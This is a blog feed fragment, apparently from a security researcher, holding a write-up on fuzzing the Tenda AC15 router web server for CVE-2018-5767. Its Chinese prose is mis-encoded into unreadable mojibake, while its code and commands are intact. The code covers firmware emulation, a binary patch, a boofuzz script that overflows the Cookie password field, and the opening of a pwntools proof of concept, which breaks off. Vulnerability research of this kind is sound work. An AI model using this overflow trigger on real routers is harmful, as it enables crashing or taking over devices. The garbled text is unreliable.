    <summary type="html">&lt;h1 id=&quot;ç¬¦å·æ‰§è¡Œ&quot;&gt;&lt;a href=&quot;#ç¬¦å·æ‰§è¡Œ&quot; class=&quot;headerlink&quot; title=&quot;ç¬¦å·æ‰§è¡Œ&quot;&gt;&lt;/a&gt;ç¬¦å·æ‰§è¡Œ&lt;/h1&gt;&lt;p&gt;ç»™ä¸€ä¸ªç»“æœï¼Œæ±‚è¾“å…¥ã€‚&lt;/p&gt;
&lt;p&gt;æ ¹æ®å‘å±•çŠ¶å†µ,å¯ä»¥å°†ç¬¦å·æ‰§è¡Œåˆ†ä¸ºç»å…¸ç¬¦å·æ‰§è¡Œã€åŠ¨æ€ç¬¦å·æ‰§è¡Œå’Œé€‰æ‹©æ€§ç¬¦å·æ‰§è¡Œ&lt;/p&gt;
&lt;h</summary>
      
    
    
    
    <category term="ç¬”è®°" scheme="p1Kk.github.io/categories/ç¬”è®°/"/>
    
    
    <category term="å¾…å®Œå–„" scheme="p1Kk.github.io/tags/å¾…å®Œå–„/"/>
    
  </entry>
  
  <entry>
    <title>ä»¥Tenda AC15 CVE-2018-5767ä¸ºä¾‹è¿›è¡Œfuzzæµ‹è¯•</title>
    <link href="p1Kk.github.io/2021/03/29/iot/Tenda%20AC15%20CVE-2018-5767%20CVE-2020-10987/"/>
    <id>p1Kk.github.io/2021/03/29/iot/Tenda%20AC15%20CVE-2018-5767%20CVE-2020-10987/</id>
    <published>2021-03-28T16:00:00.000Z</published>
    <updated>2021-05-08T10:58:58.668Z</updated>
    
    <content type="html"><![CDATA[<p>å½±å“äº§å“ï¼šTenda AC15è·¯ç”±å™¨</p><p>å½±å“ç‰ˆæœ¬ï¼š5767ï¼šV15.03.05.16 &amp; 10987ï¼šV15.03.05.18</p><p>å›ºä»¶ä¸‹è½½é“¾æ¥ï¼ˆV15.03.05.16ï¼‰ï¼š<a href="https://down.tendacn.com/uploadfile/201401/AC15/US_AC15V1.0BR_V15.03.1.16_multi_TD01.rar" target="_blank" rel="noopener">https://down.tendacn.com/uploadfile/201401/AC15/US_AC15V1.0BR_V15.03.1.16_multi_TD01.rar</a></p><h1 id="å…³äºfuzz"><a href="#å…³äºfuzz" class="headerlink" title="å…³äºfuzz"></a>å…³äºfuzz</h1><p>Fuzzingå¼•æ“ç®—æ³•ä¸­ï¼Œæµ‹è¯•ç”¨ä¾‹çš„ç”Ÿæˆæ–¹å¼ä¸»è¦æœ‰2ç§ï¼š</p><p>1ï¼‰åŸºäºå˜å¼‚ï¼šæ ¹æ®å·²çŸ¥æ•°æ®æ ·æœ¬é€šè¿‡å˜å¼‚çš„æ–¹æ³•ç”Ÿæˆæ–°çš„æµ‹è¯•ç”¨ä¾‹ï¼›</p><p>2ï¼‰åŸºäºç”Ÿæˆï¼šæ ¹æ®å·²çŸ¥çš„åè®®æˆ–æ¥å£è§„èŒƒè¿›è¡Œå»ºæ¨¡ï¼Œç”Ÿæˆæµ‹è¯•ç”¨ä¾‹ï¼›</p><p>ä¸€èˆ¬Fuzzingå·¥å…·ä¸­ï¼Œéƒ½ä¼šç»¼åˆä½¿ç”¨è¿™ä¸¤ç§ç”Ÿæˆæ–¹å¼ã€‚</p><p>åŸºäºå˜å¼‚çš„ç®—æ³•æ ¸å¿ƒè¦æ±‚æ˜¯å­¦ä¹ å·²æœ‰çš„æ•°æ®æ¨¡å‹ï¼ŒåŸºäºå·²æœ‰æ•°æ®åŠå¯¹æ•°æ®çš„åˆ†æï¼Œå†ç”Ÿæˆéšæœºæ•°æ®åšä¸ºæµ‹è¯•ç”¨ä¾‹ã€‚</p><ul><li>è€ŒBoofuzzæ˜¯Sulleyçš„ç»§æ‰¿è€…ï¼Œå±äºåŸºäº<strong>ç”Ÿæˆ</strong>çš„<strong>é»‘ç›’</strong>æ¨¡ç³Šæµ‹è¯•</li></ul><h2 id="Boofuzzå®‰è£…-ubuntu20"><a href="#Boofuzzå®‰è£…-ubuntu20" class="headerlink" title="Boofuzzå®‰è£…(ubuntu20)"></a>Boofuzzå®‰è£…(ubuntu20)</h2><p>githubï¼š<a href="https://github.com/jtpereyda/boofuzz" target="_blank" rel="noopener">https://github.com/jtpereyda/boofuzz</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install python3-pip python3-venv build-essential</span><br><span class="line">$ mkdir boofuzz &amp;&amp; cd boofuzz</span><br><span class="line">$ python3 -m venv env</span><br><span class="line">$ source env/bin/activate</span><br><span class="line">(env) $ pip install -U pip setuptools</span><br><span class="line">(env) $ pip install boofuzz</span><br><span class="line">$ alias python_boofuzz=&apos;[env_path]/bin/python&apos;</span><br></pre></td></tr></table></figure><p>å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://boofuzz.readthedocs.io/en/stable/" target="_blank" rel="noopener">https://boofuzz.readthedocs.io/en/stable/</a></p><h1 id="å›ºä»¶æ¨¡æ‹Ÿ"><a href="#å›ºä»¶æ¨¡æ‹Ÿ" class="headerlink" title="å›ºä»¶æ¨¡æ‹Ÿ"></a>å›ºä»¶æ¨¡æ‹Ÿ</h1><p>å›ºä»¶è§£åŒ…ä¸å¤šè¯´äº†</p><h2 id="user-mod"><a href="#user-mod" class="headerlink" title="user-mod"></a>user-mod</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cp $(<span class="built_in">which</span> qemu-arm-static) ./</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo chroot . ./qemu-arm-static ./bin/httpd</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ğŸ˜å¯ä»¥ç›´æ¥æ¨¡æ‹Ÿèµ·æ¥</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> å¦‚æœè¦ç”¨gdbè°ƒè¯•</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo chroot . ./qemu-arm-static -g 1234 ./bin/httpd</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ç¨‹åºå¹¶æ²¡æœ‰ä»»ä½•åŠ¨é™ï¼Œæ‰€ä»¥æˆ‘ä»¬å®šä½åˆ°<code>WeLoveLinux</code>å­—ç¬¦ä¸²æ‰€åœ¨çš„å‡½æ•°<code>sub_2CEA8</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"\n\nYes:\n\n      ****** WeLoveLinux****** \n\n Welcome to ..."</span>);</span><br><span class="line">sub_2F04C();</span><br><span class="line"><span class="keyword">while</span> ( check_network(v17) &lt;= <span class="number">0</span> )<span class="comment">// å¦‚æœéªŒè¯ä¸é€šè¿‡ï¼Œå°±ä¼šå¾ªç¯sleepï¼Œå¡æ­»</span></span><br><span class="line">  sleep(<span class="number">1u</span>);</span><br><span class="line">v1 = sleep(<span class="number">1u</span>);</span><br><span class="line"><span class="keyword">if</span> ( ConnectCfm(v1) )</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span><span class="comment">// ConnectCfmä¸é€šè¿‡ï¼Œä¹Ÿä¼šæŠ¥é”™é€€å‡º</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"connect cfm failed!"</span>);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> v2;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥å°±è€ƒè™‘patchä¿®æ”¹ä¸€ä¸‹ï¼Œå°†R0éƒ½ä¿®æ”¹ä¸º1å³å¯ç»•è¿‡</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/AC15httpdPatch.png" alt></p><p>å€ŸåŠ©<a href="http://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=mov+r3%2C+1&arch=arm&as_format=inline#assembly" target="_blank" rel="noopener">åœ¨çº¿æ±‡ç¼–åæ±‡ç¼–ç½‘ç«™</a>è¿›è¡Œpatchï¼ˆæˆ–è€…ä½¿ç”¨keypatchï¼‰ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/ac15Patched.png" alt></p><p>æ›¿æ¢æ–‡ä»¶åæ¨¡æ‹Ÿè¿è¡Œï¼Œå‘ç°ç›‘å¬çš„IPåœ°å€ä¸æ˜¯æˆ‘è™šæ‹Ÿæœºç½‘å¡åœ°å€ã€‚ï¼ˆå…³äºè¿™ä¸ªconnectçš„æŠ¥é”™å­—ç¬¦ï¼Œå¹¶æ²¡æœ‰åœ¨æ–‡ä»¶ä¸­æ‰¾åˆ°ï¼Œæš‚ä¸”ä¸ç®¡äº†</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/ac15usermodWrong2.png" alt></p><p>å†æ¬¡å®šä½åˆ°æŠ¥é”™å­—ç¬¦ä¸²ä½ç½®ï¼Œçœ‹çœ‹è¿™ä¸ªå¥‡æ€ªçš„ipæ˜¯æ€ä¹ˆæ¥çš„</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/ac15ipString.png" alt></p><p>å¾€ä¸Šæ‰¾åˆ°a1</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/ac15lan_ipXref.png" alt></p><p>å®šä½åˆ°a1çš„ç”±æ¥</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/ac15foundlan_ip.png" alt></p><p>å†æ¬¡æŸ¥æ‰¾è¯¥å…¨å±€å˜é‡çš„å¼•ç”¨ï¼Œå¹¶å¯»æ‰¾èµ‹å€¼è¯­å¥ã€‚</p><p><code>GetValue</code>å‡½æ•°è·å–<code>lan.ip</code>ï¼Œå³ä¸º<code>g_lan_ip</code>ï¼Œä½†æ˜¯è¿˜æ˜¯ä¸çŸ¥é“è¿™ä¸ªå‡½æ•°æ˜¯æ€ä¹ˆè¿ä½œçš„â€¦</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/ac15lan_ip.png" alt></p><p>å‚è€ƒæ–‡ç« æŒ‡å‡ºè¿™ä¸ªå‡½æ•°å¾€ä¸Šçš„<code>check_network</code>æ˜¯ä¸€ä¸ªå¤–éƒ¨å‡½æ•°ï¼Œå®šä¹‰åœ¨<code>libcommon.so</code>ä¸­ï¼ˆè¿™æ˜¯æ€ä¹ˆçŸ¥é“çš„ï¼Ÿ åœ¨å…¶ä¸­èƒ½æ‰¾åˆ°<code>check_network-&gt;getLanIfName()-&gt;get_eth_name(0)-&gt;br0</code>ï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è‡ªå·±æ–°å»ºä¸€ä¸ªè™šæ‹Ÿç½‘å¡<code>br0</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo tunctl -t br0 -u `whoami`</span><br><span class="line">$ sudo ifconfig br0 192.168.65.1/24</span><br></pre></td></tr></table></figure><p>å†æ¬¡è¿è¡Œå°±æˆåŠŸ~</p><h1 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h1><p>ä¸¤ä¸ªæ¼æ´éƒ½ä½äº<code>bin/httpd</code>æ–‡ä»¶ä¸­</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> file ./bin/httpd </span></span><br><span class="line">./bin/httpd: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</span><br><span class="line"><span class="meta">$</span><span class="bash"> checksec ./bin/httpd</span></span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8000)</span><br></pre></td></tr></table></figure><p>ä»è¯¥æ–‡ä»¶ä¸­æ‰¾åˆ°çš„å‡½æ•°å¯ä»¥çœ‹å‡ºæ˜¯<a href="https://xz.aliyun.com/t/2835" target="_blank" rel="noopener">åŸºäºGoAhead</a></p><p>CVE-2018-5767æ¼æ´åœ¨<code>R7WebsSecurityHandler</code>å‡½æ•°</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/ac15stackoverflow.png" alt></p><p><code>strstr()</code>åŒ¹é…åˆ°<code>password=</code>å¤„ï¼Œå¹¶ä½¿ç”¨<code>sscanf()</code>ï¼Œé€šè¿‡æ­£åˆ™è¡¨è¾¾å¼ï¼ŒåŒ¹é…<code>password</code>çš„å€¼è¯»åˆ°<code>v34</code>ã€‚</p><blockquote><p>sscanf()å‡½æ•°ç”¨äºä»å­—ç¬¦ä¸²ä¸­è¯»å–æŒ‡å®šæ ¼å¼çš„æ•°æ®ï¼Œå…¶åŸå‹å¦‚ä¸‹ï¼š<br>  int sscanf (char *str, char * format [, argument, â€¦]);</p><p>ã€å‚æ•°ã€‘å‚æ•°strä¸ºè¦è¯»å–æ•°æ®çš„å­—ç¬¦ä¸²ï¼›formatä¸ºç”¨æˆ·æŒ‡å®šçš„æ ¼å¼ï¼›argumentä¸ºå˜é‡ï¼Œç”¨æ¥ä¿å­˜è¯»å–åˆ°çš„æ•°æ®ã€‚</p><p>ã€è¿”å›å€¼ã€‘æˆåŠŸåˆ™è¿”å›å‚æ•°æ•°ç›®ï¼Œå¤±è´¥åˆ™è¿”å›-1ï¼Œé”™è¯¯åŸå› å­˜äºerrno ä¸­ã€‚</p><p>sscanf()ä¼šå°†å‚æ•°str çš„å­—ç¬¦ä¸²æ ¹æ®å‚æ•°formatï¼ˆæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼‰æ¥è½¬æ¢å¹¶æ ¼å¼åŒ–æ•°æ®ï¼ˆæ ¼å¼åŒ–å­—ç¬¦ä¸²è¯·å‚è€ƒscanf()ï¼‰ï¼Œ è½¬æ¢åçš„ç»“æœå­˜äºå¯¹åº”çš„å˜é‡ä¸­ã€‚</p><p>sscanf()ä¸scanf()ç±»ä¼¼ï¼Œéƒ½æ˜¯ç”¨äºè¾“å…¥çš„ï¼Œåªæ˜¯scanf()ä»¥é”®ç›˜(stdin)ä¸ºè¾“å…¥æºï¼Œsscanf()ä»¥å›ºå®šå­—ç¬¦ä¸²ä¸ºè¾“å…¥æºã€‚</p></blockquote><p>ç†äº†åŠå¤©è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼ ä¸å¦‚å†™ä¸€ä¸ªæµ‹è¯•ä¸€ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> result[<span class="number">100</span>] = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">char</span> s[] = <span class="string">"username=111;passwd=123;whoami=root"</span>;</span><br><span class="line"><span class="keyword">char</span> *p;</span><br><span class="line">p = <span class="built_in">strstr</span>(s, <span class="string">"passwd="</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"After strstr() -------------&gt; %s\n"</span>, p);</span><br><span class="line"></span><br><span class="line"><span class="built_in">sscanf</span>(p, <span class="string">"%*[^=]=%[^;];*"</span>, result);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"After regular expression ---&gt; %s\n"</span>, result);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./<span class="built_in">test</span> </span></span><br><span class="line">After strstr() -------------&gt; passwd=123;whoami=root</span><br><span class="line">After regular expression ---&gt; 123</span><br></pre></td></tr></table></figure><p>è€Œè¿™é‡Œæ²¡æœ‰å¯¹<code>v41</code>çš„é•¿åº¦è¿›è¡Œæ£€æµ‹ï¼Œå¦‚æœ<code>password</code>è¢«æˆ‘ä»¬ä¼ªé€ çš„è¿‡é•¿ï¼Œå°±ä¼šäº§ç”Ÿæ ˆæº¢å‡ºã€‚</p><p>IDAä¸­å¯¼å…¥ç»“æ„ä½“<code>Viewâ€“&gt;Open Subviewsâ€“&gt;Local Types ä¸­å¯ä»¥çœ‹åˆ°æœ¬åœ°å·²æœ‰çš„ç»“æ„ä½“ï¼Œå³å‡» insert.å¯ä»¥æ·»åŠ  C è¯­è¨€å£°æ˜çš„ç»“æ„ä½“</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">struct websRec &#123;</span><br><span class="line">    ringq_t         header;             /* Header dynamic string */</span><br><span class="line">    __time_t            since;              /* Parsed if-modified-since time */</span><br><span class="line">    char*       cgiVars;            /* CGI standard variables */</span><br><span class="line">    char*       cgiQuery;           /* CGI decoded query string */</span><br><span class="line">    __time_t            timestamp;          /* Last transaction with browser */</span><br><span class="line">    int             timeout;            /* Timeout handle */</span><br><span class="line">    char            ipaddr[32];         /* Connecting ipaddress */</span><br><span class="line">    char            type[64];           /* Mime type */</span><br><span class="line">    char            *dir;               /* Directory containing the page */</span><br><span class="line">    char            *path;              /* Path name without query */</span><br><span class="line">    char            *url;               /* Full request url */</span><br><span class="line">    char            *host;              /* Requested host */</span><br><span class="line">    char            *lpath;             /* Cache local path name */</span><br><span class="line">    char            *query;             /* Request query */</span><br><span class="line">    char            *decodedQuery;      /* Decoded request query */</span><br><span class="line">    char            *authType;          /* Authorization type (Basic/DAA) */</span><br><span class="line">    char            *password;          /* Authorization password */</span><br><span class="line">    char            *userName;          /* Authorization username */</span><br><span class="line">    char            *cookie;            /* Cookie string */</span><br><span class="line">    char            *userAgent;         /* User agent (browser) */</span><br><span class="line">    char            *protocol;          /* Protocol (normally HTTP) */</span><br><span class="line">    char            *protoVersion;      /* Protocol version */</span><br><span class="line">    int             sid;                /* Socket id (handler) */</span><br><span class="line">    int             listenSid;          /* Listen Socket id */</span><br><span class="line">    int             port;               /* Request port number */</span><br><span class="line">    int             state;              /* Current state */</span><br><span class="line">    int             flags;              /* Current flags -- see above */</span><br><span class="line">    int             code;               /* Request result code */</span><br><span class="line">    int             clen;               /* Content length */</span><br><span class="line">    int             wid;                /* Index into webs */</span><br><span class="line">    char            *cgiStdin;          /* filename for CGI stdin */</span><br><span class="line">    int             docfd;              /* Document file descriptor */</span><br><span class="line">    int             numbytes;           /* Bytes to transfer to browser */</span><br><span class="line">    int             written;            /* Bytes actually transferred */</span><br><span class="line">    void            (*writeSocket)(struct websRec *wp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°†<code>v41</code>ä¿®æ”¹ä¸º<code>websRec</code>ç»“æ„ä½“ï¼ˆ<code>å³é”® -&gt; Convert to struct*...</code>ï¼‰</p><p>å¯ä»¥çœ‹å‡ºï¼Œè·å–çš„æ˜¯Cookieå­—æ®µçš„å€¼</p><h3 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h3><p>ä½¿ç”¨boo-fuzzæ¡†æ¶ï¼Œ</p><p>æµ‹è¯•æº¢å‡º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"># fuzz.py</span><br><span class="line">from boofuzz import *</span><br><span class="line"></span><br><span class="line">IP = &quot;192.168.65.1&quot;</span><br><span class="line">PORT = 80</span><br><span class="line"></span><br><span class="line">def check_response(target, fuzz_data_logger, session, *args, **kwargs):</span><br><span class="line">    fuzz_data_logger.log_info(&quot;Checking test case response...&quot;)</span><br><span class="line">    try:</span><br><span class="line">        response = target.recv(512)</span><br><span class="line">    except:</span><br><span class="line">        fuzz_data_logger.log_fail(&quot;Unable to connect to target. Closing...&quot;)</span><br><span class="line">        target.close()</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    #if empty response</span><br><span class="line">    if not response:</span><br><span class="line">        fuzz_data_logger.log_fail(&quot;Empty response, target may be hung. Closing...&quot;)</span><br><span class="line">        target.close()</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    #remove everything after null terminator, and convert to string</span><br><span class="line">    #response = response[:response.index(0)].decode(&apos;utf-8&apos;)</span><br><span class="line">    fuzz_data_logger.log_info(&quot;response check...\n&quot; + response.decode())</span><br><span class="line">    target.close()</span><br><span class="line">    return</span><br><span class="line">    </span><br><span class="line">def main():</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    options = &#123;</span><br><span class="line">        &quot;start_commands&quot;: [</span><br><span class="line">            &quot;sudo chroot /home/lys/Documents/IoT/firmware/_AC15_V15.03.1.16.bin.extracted/squashfs-root ./httpd&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;stop_commands&quot;: [&quot;echo stopping&quot;],</span><br><span class="line">        &quot;proc_name&quot;: [&quot;/usr/bin/qemu-arm-static ./httpd&quot;]</span><br><span class="line">    &#125;</span><br><span class="line">    procmon = ProcessMonitor(&quot;127.0.0.1&quot;, 26002)</span><br><span class="line">    procmon.set_options(**options)</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">    session = Session(</span><br><span class="line">        target=Target(</span><br><span class="line">            connection=SocketConnection(IP, PORT, proto=&quot;tcp&quot;),</span><br><span class="line">            # monitors=[procmon]</span><br><span class="line">        ),</span><br><span class="line">        post_test_case_callbacks=[check_response],</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    s_initialize(name=&quot;Request&quot;)</span><br><span class="line">    with s_block(&quot;Request-Line&quot;):</span><br><span class="line">        # Line 1</span><br><span class="line">        s_group(&quot;Method&quot;, [&quot;GET&quot;])</span><br><span class="line">        s_delim(&quot; &quot;, fuzzable=False, name=&quot;space-1-1&quot;)</span><br><span class="line">        s_string(&quot;/goform/123&quot;, fuzzable=False)    # fuzzable 1</span><br><span class="line">        s_delim(&quot; &quot;, fuzzable=False, name=&quot;space-1-2&quot;)</span><br><span class="line">        s_static(&quot;HTTP/1.1&quot;, name=&quot;HTTP_VERSION&quot;)</span><br><span class="line">        s_static(&quot;\r\n&quot;, name=&quot;Request-Line-CRLF-1&quot;)</span><br><span class="line">        # Line 2</span><br><span class="line">        s_static(&quot;Host&quot;)</span><br><span class="line">        s_delim(&quot;: &quot;, fuzzable=False, name=&quot;space-2-1&quot;)</span><br><span class="line">        s_string(&quot;192.168.0.5&quot;, fuzzable=False, name=&quot;IP address&quot;)</span><br><span class="line">        s_static(&quot;\r\n&quot;, name=&quot;Request-Line-CRLF-2&quot;)</span><br><span class="line">        # Line 3</span><br><span class="line">        s_static(&quot;Connection&quot;)</span><br><span class="line">        s_delim(&quot;: &quot;, fuzzable=False, name=&quot;space-3-1&quot;)</span><br><span class="line">        s_string(&quot;keep-alive&quot;, fuzzable=False, name=&quot;Connection state&quot;)</span><br><span class="line">        s_static(&quot;\r\n&quot;, name=&quot;Request-Line-CRLF-3&quot;)</span><br><span class="line">        # Line 4</span><br><span class="line">        s_static(&quot;Cookie&quot;)</span><br><span class="line">        s_delim(&quot;: &quot;, fuzzable=False, name=&quot;space-4-1&quot;)</span><br><span class="line">        s_string(&quot;bLanguage&quot;, fuzzable=False, name=&quot;key-bLanguage&quot;)</span><br><span class="line">        s_delim(&quot;=&quot;, fuzzable=False)</span><br><span class="line">        s_string(&quot;en&quot;, fuzzable=False, name=&quot;value-bLanguage&quot;)</span><br><span class="line">        s_delim(&quot;; &quot;, fuzzable=False)</span><br><span class="line">        s_string(&quot;password&quot;, fuzzable=False, name=&quot;key-password&quot;)</span><br><span class="line">        s_delim(&quot;=&quot;, fuzzable=False)</span><br><span class="line">        s_string(&quot;ce24124987jfjekfjlasfdjmeiruw398r&quot;, fuzzable=True)    # fuzzable 2</span><br><span class="line">        s_static(&quot;\r\n&quot;, name=&quot;Request-Line-CRLF-4&quot;)</span><br><span class="line">        # over</span><br><span class="line">        s_static(&quot;\r\n&quot;)</span><br><span class="line">        s_static(&quot;\r\n&quot;)</span><br><span class="line"></span><br><span class="line">    session.connect(s_get(&quot;Request&quot;))</span><br><span class="line">    session.fuzz()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>boofuzzæç¤ºå‡ºç°é”™è¯¯ï¼ˆä¹Ÿå¯ä»¥é€šè¿‡è®¿é—®<code>127.0.0.1:26000</code>è¿›è¡Œå›¾å½¢åŒ–ç•Œé¢æŸ¥çœ‹ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/AC15fuzz_wrong.png" alt></p><p>æ ¹æ®fuzzç»“æœç¼–å†™ä¸€ä¸ªæµ‹è¯•poc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># testPOC</span><br><span class="line">#!usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">ip = &quot;192.168.65.1&quot;</span><br><span class="line">url = &quot;http://%s/goform/execCommand&quot;%ip</span><br><span class="line">cookie = 